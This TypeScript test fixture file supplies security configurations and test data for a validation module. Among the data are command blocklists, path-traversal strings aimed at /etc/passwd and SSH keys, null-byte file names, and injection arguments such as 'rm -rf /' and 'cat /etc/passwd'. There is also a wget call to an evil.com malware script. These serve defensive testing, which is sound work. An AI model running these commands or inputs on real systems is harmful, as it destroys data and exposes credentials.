/**
 * Test Fixtures - Security Configurations
 *
 * Provides predefined security configurations for testing different scenarios.
 *
 * @module v3/security/__tests__/fixtures/configurations
 */

/**
 * Security configuration type for testing
 */
export interface SecurityConfig {
  hashing: {
    algorithm: 'argon2' | 'bcrypt' | 'scrypt';
    memoryCost?: number;
    timeCost?: number;
    parallelism?: number;
    rounds?: number;
  };
  execution: {
    shell: boolean;
    timeout: number;
    allowedCommands: string[];
    blockedCommands: string[];
  };
  paths: {
    blockedPatterns: string[];
    maxPathLength: number;
    allowHidden: boolean;
  };
  validation: {
    maxInputSize: number;
    sanitizeHtml: boolean;
    allowedChars: RegExp;
  };
  tokens: {
    defaultExpiration: number;
    hmacAlgorithm: string;
    tokenLength: number;
  };
}

/**
 * Strict security configuration - maximum security settings
 */
const strictConfig: SecurityConfig = {
  hashing: {
    algorithm: 'argon2',
    memoryCost: 65536,
    timeCost: 3,
    parallelism: 4,
  },
  execution: {
    shell: false,
    timeout: 30000,
    allowedCommands: ['npm', 'npx', 'node', 'git'],
    blockedCommands: [
      'rm',
      'rmdir',
      'del',
      'format',
      'mkfs',
      'dd',
      'chmod',
      'chown',
      'kill',
      'killall',
      'pkill',
      'reboot',
      'shutdown',
      'init',
      'poweroff',
      'halt',
      'wget',
      'curl',
      'bash',
      'sh',
      'zsh',
      'eval',
    ],
  },
  paths: {
    blockedPatterns: [
      '../',
      '..\\',
      '/etc/',
      '/tmp/',
      '/var/',
      '/usr/',
      '/bin/',
      '/sbin/',
      '~/',
      '%2e%2e',
      '\0',
    ],
    maxPathLength: 4096,
    allowHidden: false,
  },
  validation: {
    maxInputSize: 10000,
    sanitizeHtml: true,
    allowedChars: /^[a-zA-Z0-9._\-\s]+$/,
  },
  tokens: {
    defaultExpiration: 3600,
    hmacAlgorithm: 'sha256',
    tokenLength: 32,
  },
};

/**
 * Development security configuration - relaxed for local development
 */
const developmentConfig: SecurityConfig = {
  hashing: {
    algorithm: 'bcrypt',
    rounds: 10,
  },
  execution: {
    shell: false,
    timeout: 60000,
    allowedCommands: ['npm', 'npx', 'node', 'git', 'ls', 'cat', 'grep', 'find', 'echo'],
    blockedCommands: ['rm', 'rmdir', 'del', 'format', 'mkfs', 'dd'],
  },
  paths: {
    blockedPatterns: ['../', '..\\', '/etc/passwd', '/etc/shadow'],
    maxPathLength: 8192,
    allowHidden: true,
  },
  validation: {
    maxInputSize: 100000,
    sanitizeHtml: true,
    allowedChars: /^[a-zA-Z0-9._\-\s@#$%^&*()+=[\]{}|;:,.<>?/\\]+$/,
  },
  tokens: {
    defaultExpiration: 86400,
    hmacAlgorithm: 'sha256',
    tokenLength: 32,
  },
};

/**
 * Testing security configuration - minimal restrictions for test speed
 */
const testingConfig: SecurityConfig = {
  hashing: {
    algorithm: 'bcrypt',
    rounds: 4, // Fast for testing
  },
  execution: {
    shell: false,
    timeout: 5000,
    allowedCommands: ['echo', 'true', 'false', 'node'],
    blockedCommands: ['rm', 'dd'],
  },
  paths: {
    blockedPatterns: ['../', '/etc/'],
    maxPathLength: 1024,
    allowHidden: true,
  },
  validation: {
    maxInputSize: 1000,
    sanitizeHtml: false,
    allowedChars: /^.*$/,
  },
  tokens: {
    defaultExpiration: 60,
    hmacAlgorithm: 'sha256',
    tokenLength: 16,
  },
};

/**
 * CI/CD security configuration - optimized for automated testing
 */
const cicdConfig: SecurityConfig = {
  hashing: {
    algorithm: 'bcrypt',
    rounds: 6,
  },
  execution: {
    shell: false,
    timeout: 10000,
    allowedCommands: ['npm', 'npx', 'node', 'git', 'echo'],
    blockedCommands: ['rm', 'rmdir', 'del', 'format', 'mkfs', 'dd', 'chmod', 'chown'],
  },
  paths: {
    blockedPatterns: ['../', '..\\', '/etc/', '/tmp/', '~/', '\0'],
    maxPathLength: 4096,
    allowHidden: false,
  },
  validation: {
    maxInputSize: 50000,
    sanitizeHtml: true,
    allowedChars: /^[a-zA-Z0-9._\-\s]+$/,
  },
  tokens: {
    defaultExpiration: 300,
    hmacAlgorithm: 'sha256',
    tokenLength: 32,
  },
};

/**
 * Legacy security configuration - for backward compatibility testing
 */
const legacyConfig: SecurityConfig = {
  hashing: {
    algorithm: 'bcrypt',
    rounds: 10,
  },
  execution: {
    shell: true, // Legacy allowed shell
    timeout: 30000,
    allowedCommands: [],
    blockedCommands: ['rm -rf /', 'format c:'],
  },
  paths: {
    blockedPatterns: [],
    maxPathLength: 255, // Old Windows limit
    allowHidden: true,
  },
  validation: {
    maxInputSize: 1024 * 1024,
    sanitizeHtml: false,
    allowedChars: /^.*$/,
  },
  tokens: {
    defaultExpiration: 604800, // 1 week
    hmacAlgorithm: 'sha1', // Legacy
    tokenLength: 16,
  },
};

/**
 * Export all security configurations
 */
export const securityConfigs = {
  strict: strictConfig,
  development: developmentConfig,
  testing: testingConfig,
  cicd: cicdConfig,
  legacy: legacyConfig,
} as const;

/**
 * Default configuration (uses strict in production-like tests)
 */
export const defaultConfig = strictConfig;

/**
 * Test data fixtures
 */
export const testPasswords = {
  strong: 'SecureP@ssword123!',
  medium: 'Password123',
  weak: 'password',
  short: 'Abc1!',
  noUpper: 'password123!',
  noLower: 'PASSWORD123!',
  noDigit: 'SecurePassword!',
  noSpecial: 'SecurePassword123',
  empty: '',
  tooLong: 'A'.repeat(200) + '1!a',
};

export const testPaths = {
  safe: [
    './src/index.ts',
    './tests/unit/test.ts',
    '/workspaces/project/src/file.ts',
    'relative/path/file.js',
  ],
  traversal: [
    '../../../etc/passwd',
    '..\\..\\..\\Windows\\System32',
    '....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%00/etc/passwd',
  ],
  absoluteSystem: [
    '/etc/passwd',
    '/etc/shadow',
    '/var/log/auth.log',
    '/tmp/malicious',
    '/usr/bin/rm',
  ],
  nullByte: [
    'file.txt\0.exe',
    'image.jpg\x00.php',
    'safe.txt%00.sh',
  ],
  hidden: [
    '.env',
    '.git/config',
    '.ssh/id_rsa',
    '.htpasswd',
    '~/.bashrc',
  ],
};

export const testCommands = {
  safe: {
    command: 'npm',
    args: ['install', '--save', 'lodash'],
  },
  dangerous: {
    command: 'rm',
    args: ['-rf', '/'],
  },
  injection: {
    command: 'npm',
    args: ['install; rm -rf /', 'package'],
  },
  pipeInjection: {
    command: 'npm',
    args: ['install | cat /etc/passwd'],
  },
  substitution: {
    command: 'npm',
    args: ['install $(whoami)'],
  },
  backtick: {
    command: 'npm',
    args: ['install `rm -rf /`'],
  },
  notAllowed: {
    command: 'wget',
    args: ['http://evil.com/malware.sh'],
  },
};

export const testEmails = {
  valid: [
    'user@example.com',
    'user.name@example.co.uk',
    'user+tag@example.org',
    'user@sub.domain.example.com',
  ],
  invalid: [
    'notanemail',
    '@nodomain.com',
    'no@',
    'spaces in@email.com',
    'user@.com',
    '',
  ],
};

export const testUUIDs = {
  valid: [
    '550e8400-e29b-41d4-a716-446655440000',
    '123e4567-e89b-12d3-a456-426614174000',
    'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11',
  ],
  invalid: [
    'not-a-uuid',
    '550e8400-e29b-41d4-a716',
    '550e8400e29b41d4a716446655440000',
    '',
  ],
};

export const testIdentifiers = {
  valid: [
    'validId',
    'valid-id',
    'valid_id',
    'validId123',
    'Valid123Id',
  ],
  invalid: [
    '123invalid',
    'invalid@id',
    'invalid id',
    'invalid.id',
    '',
    '-invalid',
  ],
};

/**
 * Factory for creating test scenarios
 */
export function createTestScenario(
  name: string,
  config: SecurityConfig,
  expectations: {
    shouldPass: boolean;
    errorPatterns?: string[];
  }
) {
  return {
    name,
    config,
    ...expectations,
  };
}

/**
 * Common test scenarios
 */
export const testScenarios = {
  strictPathTraversal: createTestScenario(
    'Strict path traversal prevention',
    strictConfig,
    { shouldPass: false, errorPatterns: ['traversal'] }
  ),
  developmentRelaxed: createTestScenario(
    'Development allows more paths',
    developmentConfig,
    { shouldPass: true }
  ),
  testingFast: createTestScenario(
    'Testing uses fast hashing',
    testingConfig,
    { shouldPass: true }
  ),
};
